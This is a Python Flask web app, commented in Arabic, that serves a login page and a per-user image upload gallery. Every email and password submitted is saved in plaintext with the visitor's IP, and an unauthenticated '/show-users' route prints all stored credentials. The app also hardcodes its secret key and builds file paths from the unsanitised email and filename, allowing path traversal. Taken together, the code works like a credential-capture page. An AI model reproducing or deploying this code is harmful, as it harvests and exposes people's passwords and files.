from flask import Flask, render_template, request, redirect, session, send_from_directory
import os

app = Flask(__name__)
app.secret_key = "supersecretkey"

UPLOAD_FOLDER = "static/uploads"
USER_FILE = "users.txt"

# إنشاء مجلد رفع الصور إذا لم يكن موجودًا
if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)


# حفظ المستخدم الجديد مع IP
def save_user(email, password, ip):
    with open(USER_FILE, "a") as f:
        f.write(f"{email}:{password}:{ip}\n")


# التحقق من وجود المستخدم مسبقًا
def user_exists(email, password):
    if not os.path.exists(USER_FILE):
        return False
    with open(USER_FILE, "r") as f:
        users = f.readlines()
    return any(f"{email}:{password}" in user for user in users)


# الصفحة الرئيسية: تسجيل IP وعرض نموذج الدخول
@app.route("/", methods=["GET", "POST"])
def home():
    visitor_ip = request.remote_addr

    if request.method == "POST":
        email = request.form["email"]
        password = request.form["password"]

        # تسجيل المستخدم إذا لم يكن موجودًا
        if not user_exists(email, password):
            save_user(email, password, visitor_ip)

        # حفظ الجلسة وإنشاء مجلد خاص به
        session["email"] = email
        user_folder = os.path.join(UPLOAD_FOLDER, email)
        os.makedirs(user_folder, exist_ok=True)

        return redirect("/upload")

    # تسجيل IP في أول دخول (GET)
    print(f"تمت زيارة الموقع من IP: {visitor_ip}")
    with open('ip_log.txt', 'a') as f:
        f.write(f"{visitor_ip}\n")

    return render_template("login.html")


# صفحة رفع الصور
@app.route("/upload", methods=["GET", "POST"])
def upload():
    if "email" not in session:
        return redirect("/")

    email = session["email"]
    user_folder = os.path.join(UPLOAD_FOLDER, email)

    if request.method == "POST":
        for file in request.files.getlist("images"):
            if file and allowed_file(file.filename):
                file_path = os.path.join(user_folder, file.filename)
                file.save(file_path)

    images = os.listdir(user_folder)
    return render_template("gallery.html", images=images, email=email)


# لعرض الصور مباشرة من السيرفر
@app.route("/uploads/<email>/<filename>")
def uploaded_file(email, filename):
    return send_from_directory(os.path.join(UPLOAD_FOLDER, email), filename)


# عرض جميع المستخدمين (اختياري)
@app.route("/show-users")
def show_users():
    try:
        with open(USER_FILE, 'r') as f:
            users = f.readlines()
        return "<br>".join([user.strip() for user in users])
    except:
        return "لم يتم العثور على أي مستخدمين."


# التحقق من أنواع الصور المسموح بها
def allowed_file(filename):
    allowed_extensions = {'png', 'jpg', 'jpeg', 'gif'}
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in allowed_extensions

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)
